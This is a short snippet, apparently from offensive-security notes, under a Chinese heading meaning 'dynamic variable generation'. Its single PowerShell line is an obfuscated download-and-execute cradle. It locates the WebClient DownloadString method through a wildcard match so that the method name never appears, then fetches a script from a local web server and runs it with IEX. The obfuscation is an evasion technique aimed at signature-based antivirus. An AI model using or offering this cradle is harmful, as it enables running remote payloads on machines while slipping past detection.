# 动态变量生成
IEX (New-Object Net.WebClient).(((New-Object Net.WebClient).PsObject.Methods | Where-Object {$_.Name -like '*own*d*ing'}).Name).Invoke("http://127.0.0.1:8899/qiye.txt")